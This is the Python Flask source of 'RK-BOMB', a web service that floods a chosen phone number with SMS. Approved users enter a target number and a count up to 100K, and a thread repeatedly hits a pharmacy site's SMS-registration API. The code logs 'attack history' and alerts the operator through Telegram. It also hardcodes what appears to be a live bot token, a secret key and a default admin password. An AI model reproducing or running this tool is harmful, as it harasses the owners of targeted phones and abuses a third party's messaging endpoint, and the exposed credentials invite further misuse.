import requests, threading, os, time, json, sqlite3
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from requests_toolbelt.multipart.encoder import MultipartEncoder
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_RAIHAN_PREMIUM_V16"

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" 
RENDER_URL = "https://rk-bomb.onrender.com" 
ADMIN_USERNAME = "admin"

# ---------- DATABASE ----------
def get_db():
    conn = sqlite3.connect('system.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, role TEXT, status TEXT)')
    conn.execute('CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY, username TEXT, phone TEXT, success INTEGER, total INTEGER, status TEXT)')
    try:
        conn.execute("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'admin', 'approved')", 
                     (ADMIN_USERNAME, generate_password_hash("admin123")))
        conn.commit()
    except: pass
    conn.close()

init_db()

# ---------- CORE BOMBING ----------
active_sessions = {}

def bombing_task(username, phone, limit):
    key = f"{username}_{phone}"
    while key in active_sessions:
        if active_sessions[key]['total'] >= limit:
            conn = get_db()
            conn.execute("INSERT INTO history (username, phone, success, total, status) VALUES (?,?,?,?,?)",
                         (username, phone, active_sessions[key]['success'], active_sessions[key]['total'], "completed"))
            conn.commit()
            conn.close()
            del active_sessions[key]
            break
        
        if active_sessions[key]['status'] == 'running':
            try:
                # API Call (Example)
                requests.get(f"https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={phone}", timeout=5)
                active_sessions[key]['success'] += 1
            except: pass
            active_sessions[key]['total'] += 1
            time.sleep(1)
        else: time.sleep(2)

# ---------- DESIGN (HIGH QUALITY & FULL SCREEN) ----------
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RK-BOMB ★ PREMIUM</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: #0a0a0a; color: #fff; font-family: 'Poppins', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        
        /* Header & Sidebar */
        .header { background: #111; padding: 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff00; position: sticky; top:0; z-index: 100; box-shadow: 0 4px 10px rgba(0,255,0,0.2); }
        .menu-btn { font-size: 24px; cursor: pointer; color: #00ff00; border: none; background: none; }
        .brand { color: #00ff00; font-weight: 600; font-size: 20px; letter-spacing: 1px; }

        .sidebar { height: 100%; width: 0; position: fixed; z-index: 1001; top: 0; left: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); overflow-x: hidden; transition: 0.3s; padding-top: 60px; border-right: 1px solid #00ff00; }
        .sidebar a { padding: 15px 30px; text-decoration: none; font-size: 18px; color: #fff; display: block; transition: 0.2s; border-bottom: 1px solid #222; }
        .sidebar a:hover { background: #00ff00; color: #000; }
        .sidebar .close-btn { position: absolute; top: 10px; right: 20px; font-size: 36px; color: #ff0000; text-decoration: none; }

        /* Main Container */
        .container { padding: 20px; width: 100%; max-width: 500px; margin: auto; min-height: 80vh; }
        .card { background: #1a1a1a; border: 1px solid #333; padding: 25px; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-top: 4px solid #00ff00; }
        h2, h3 { margin-top: 0; color: #00ff00; text-align: center; }

        /* Inputs & Buttons */
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #aaa; }
        input { width: 100%; padding: 15px; background: #000; border: 1px solid #444; color: #fff; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
        input:focus { border-color: #00ff00; box-shadow: 0 0 10px rgba(0,255,0,0.3); }
        
        .btn-primary { width: 100%; padding: 15px; background: #00ff00; border: none; color: #000; font-size: 18px; font-weight: 600; border-radius: 10px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-primary:active { transform: scale(0.98); }
        .btn-danger { background: #ff4d4d; color: #fff; margin-top: 15px; border-radius: 8px; padding: 10px; border: none; width: 100%; font-weight: 600; }

        /* Status & History */
        .status-box { background: #222; border-radius: 10px; padding: 15px; margin-top: 15px; border-left: 4px solid #00ccff; }
        .progress-container { background: #333; height: 10px; border-radius: 5px; margin: 10px 0; overflow: hidden; }
        .progress-fill { background: #00ff00; height: 100%; transition: 0.5s; width: 0%; }
        
        footer { text-align: center; padding: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>

<div id="mySidebar" class="sidebar">
    <a href="javascript:void(0)" class="close-btn" onclick="closeNav()">&times;</a>
    <a href="/dashboard" onclick="closeNav()">🏠 Home Dashboard</a>
    <a href="/history" onclick="closeNav()">📜 Attack History</a>
    <a href="/logout" style="color:#ff4d4d;">🛑 Logout System</a>
</div>

<div class="header">
    <button class="menu-btn" onclick="openNav()">&#9776;</button>
    <div class="brand">RK-BOMB ★</div>
    <div style="width: 24px;"></div> </div>

<div class="container">
    {% block content %}{% endblock %}
</div>

<footer>Powered by RK RAIHAN ★ 2026</footer>

<script>
    function openNav() { document.getElementById("mySidebar").style.width = "280px"; }
    function closeNav() { document.getElementById("mySidebar").style.width = "0"; }
</script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form['u'], request.form['p']
        conn = get_db()
        res = conn.execute("SELECT password, status FROM users WHERE username = ?", (u,)).fetchone()
        conn.close()
        if res and check_password_hash(res['password'], p):
            if res['status'] == 'approved':
                session['user'] = u
                return redirect(url_for('dashboard'))
            return "<script>alert('Account Pending Approval!'); window.location='/';</script>"
    return render_template_string(HTML_LAYOUT.replace('{% block content %}{% endblock %}', '''
    <div class="card">
        <h2>LOGIN</h2>
        <form method="POST">
            <div class="input-group">
                <label>Username</label>
                <input name="u" type="text" placeholder="Enter username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input name="p" type="password" placeholder="Enter password" required>
            </div>
            <button class="btn-primary">SECURE LOGIN</button>
        </form>
        <p style="text-align:center; font-size:14px; margin-top:20px;">
            Don't have an account? <a href="/register" style="color:#00ff00; text-decoration:none;">Create Now</a>
        </p>
    </div>
    '''))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p = request.form['u'], generate_password_hash(request.form['p'])
        try:
            conn = get_db()
            conn.execute("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'user', 'pending')", (u, p))
            conn.commit()
            conn.close()
            # Telegram Alert
            requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage", 
                          json={"chat_id": MY_CHAT_ID, "text": f"🔔 *New User Registered*\n👤 Username: {u}", "parse_mode": "Markdown"})
            return "<script>alert('Registered! Please wait for approval.'); window.location='/';</script>"
        except: return "<script>alert('Username taken!'); window.history.back();</script>"
    return render_template_string(HTML_LAYOUT.replace('{% block content %}{% endblock %}', '''
    <div class="card">
        <h2>REGISTER</h2>
        <form method="POST">
            <input name="u" placeholder="New Username" style="margin-bottom:15px;" required>
            <input name="p" type="password" placeholder="New Password" style="margin-bottom:15px;" required>
            <button class="btn-primary">CREATE ACCOUNT</button>
        </form>
    </div>
    '''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(HTML_LAYOUT + '''
    {% block content %}
    <div class="card">
        <h3>🔥 START ATTACK</h3>
        <form action="/api/start">
            <input name="num" type="tel" placeholder="Target Number (01...)" style="margin-bottom:15px;" required>
            <input name="amt" type="number" placeholder="Amount (Limit 100K)" style="margin-bottom:15px;" required>
            <button class="btn-primary">LAUNCH FIRE</button>
        </form>
    </div>
    <div id="live-status"></div>
    <script>
        setInterval(() => {
            fetch('/api/status').then(r => r.json()).then(data => {
                let html = '';
                for(let k in data) {
                    let s = data[k];
                    let percent = Math.round((s.total/s.limit)*100);
                    html += `<div class="card" style="border-top-color:#00ccff;">
                        <b style="color:#00ccff;">📱 Target: ${s.phone}</b>
                        <div style="font-size:14px; margin-top:5px;">Success: ${s.success} | Failed: ${s.total - s.success}</div>
                        <div class="progress-container"><div class="progress-fill" style="width:${percent}%"></div></div>
                        <div style="text-align:right; font-size:12px;">${percent}% Completed</div>
                        <button class="btn-danger" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                    </div>`;
                }
                document.getElementById('live-status').innerHTML = html;
            });
        }, 2000);
    </script>
    {% endblock %}
    ''')

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    conn = get_db()
    rows = conn.execute("SELECT * FROM history WHERE username = ? ORDER BY id DESC LIMIT 10", (session['user'],)).fetchall()
    conn.close()
    return render_template_string(HTML_LAYOUT + '''
    {% block content %}
    <h3>📜 RECENT HISTORY</h3>
    {% for r in rows %}
    <div class="status-box">
        <b>📱 {{r['phone']}}</b><br>
        <small>Total: {{r['total']}} | Success: {{r['success']}} | {{r['status']}}</small>
    </div>
    {% endfor %}
    {% endblock %}
    ''')

@app.route('/api/start')
def start():
    u, num, amt = session.get('user'), request.args.get('num'), int(request.args.get('amt', 0))
    if u and num and amt:
        key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'status': 'running', 'success': 0, 'total': 0, 'limit': amt}
        threading.Thread(target=bombing_task, args=(u, num, amt), daemon=True).start()
        requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage", 
                      json={"chat_id": MY_CHAT_ID, "text": f"🚀 *Attack Started!*\n👤 User: {u}\n📱 Target: {num}", "parse_mode": "Markdown"})
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def status():
    return jsonify({k:v for k,v in active_sessions.items() if k.startswith(session.get('user',''))})

@app.route('/api/stop')
def stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: del active_sessions[key]
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10800))
    app.run(host='0.0.0.0', port=port)
